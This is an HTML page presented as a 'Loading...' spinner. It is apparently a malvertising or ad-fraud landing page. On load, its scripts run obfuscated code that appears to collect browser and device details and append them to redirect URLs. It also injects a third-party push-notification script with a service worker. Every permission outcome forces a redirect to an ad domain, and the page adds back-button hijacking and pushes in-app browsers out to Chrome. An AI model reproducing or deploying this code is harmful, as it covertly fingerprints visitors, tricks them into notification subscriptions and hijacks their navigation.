<!DOCTYPE html>
<html>
<head>
  <meta name="pushsdk" content="c637a090aed3ab2a9f759f5d73ba1f11">
  <style>
    body {
        background-color: #3b3b3b;  
        display: flex;
        justify-content: center;
        align-items: center;
        height: 70vh;
        flex-direction: column;
        font-size: 4rem; 
        color: #FFFAF0
    }
    .loading {
      width: 150px;
      height: 150px;
      border: 15px solid #FFFAF0;
      border-top-color: transparent;
      border-radius: 100%;
      margin-bottom: 16px;
      animation: circle infinite 0.75s linear;
    }
    
    @keyframes circle {
      0% {
        transform: rotate(0);
      }
      100% {
        transform: rotate(360deg);
      }
    }
  </style>

  <script>
    function GetQueryString(name) {
      var reg = new RegExp("(^|&)"+ name +"=([^&]*)(&|$)");
      var r = window.location.search.substr(1).match(reg);
      if(r!=null)return decodeURI(r[2]); return null;
    }
  </script>
  
  <script>
    const key = GetQueryString("key");
    const c1 = GetQueryString("c1");
    const c2 = GetQueryString("c2");
    const redirectUrl = "http://ig2kv.bemobtrcks.com/go/" + key + "?c1=" + c1 + "&c2=" + c2;
  </script>
  <script>
    var a='mcrpolfattafloprcmlVeedrosmico?ncc=uca&FcusleluVlearVsyipoonrctannEdhrgoiiHdt_emgocdeellicboosmccoast_avDetrnseigoAnrcebsruocw=seelri_bvoemr_ssiiocn'.split('').reduce((m,c,i)=>i%2?m+c:c+m).split('c');var Replace=(o=>{var v=a[0];try{v+=a[1]+Boolean(navigator[a[2]][a[3]]);navigator[a[2]][a[4]](o[0]).then(r=>{o[0].forEach(k=>{v+=r[k]?a[5]+o[1][o[0].indexOf(k)]+a[6]+encodeURIComponent(r[k]):a[0]})})}catch(e){}return u=>window.location.replace([u,v].join(u.indexOf(a[7])>-1?a[5]:a[7]))})([[a[8],a[9],a[10],a[11]],[a[12],a[13],a[14],a[15]]]); 
    var s = document.createElement('script');
    s.src='//kmnts.com/f86/ce89d/mw.min.js?z=9866210'+'&sw=/sw-check-permissions-d0fdc.js'+'&nouns=1';
    s.onload = function(result) {
        switch (result) {
            case 'onPermissionDefault':
            Replace("//g0st.com/4/9866267");break;
            case 'onPermissionAllowed':
            Replace("//g0st.com/4/9866267");break;
            case 'onPermissionDenied':
            Replace("//g0st.com/4/9866267");break;
            case 'onAlreadySubscribed':
            Replace("//g0st.com/4/9866267");break;
            case 'onNotificationUnsupported':
            Replace("//g0st.com/4/9866267");break;
        }
    };
    document.head.appendChild(s);
  </script>
  <script>
        var Back_Button_Zone = 9866267;
        var Domain_TB = "g0st.com";
  </script>
  <script async src="https://[object Object]/f86/ce89d/reverse.min.js?sf=1"></script>

  <script>
      function isInApp() {
          const regex = new RegExp(`(WebView|(iPhone|iPod|iPad)(?!.*Safari/)|Android.*(wv))`, 'ig');
          return Boolean(navigator.userAgent.match(regex));
      }

      function initInappRd() {
          var landingpageURL = window.location.hostname + window.location.pathname + window.location.search;
          var completeRedirectURL = 'intent://' + landingpageURL + '#Intent;scheme=https;package=com.android.chrome;end';
          var trafficbackURL = "https://g0st.com/4/9866267/";
          var ua = navigator.userAgent.toLowerCase();

          if (isInApp() && (ua.indexOf('fb') !== -1 || ua.indexOf('android') !== -1 || ua.indexOf('wv') !== -1)) {
              document.body.addEventListener('click', function () {
                  window.onbeforeunload = null;
                  window.open(completeRedirectURL, '_system');
                  setTimeout(function () {
                      window.location.replace(trafficbackURL);
                  }, 1000);
              });
          }
      }

      if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', initInappRd);
      } else {
          initInappRd();
      }
  </script>

  
       
</head>
<body>
    <div><b>Loading...</b></div><br>
    <div class="loading"></div>
</body>
</html>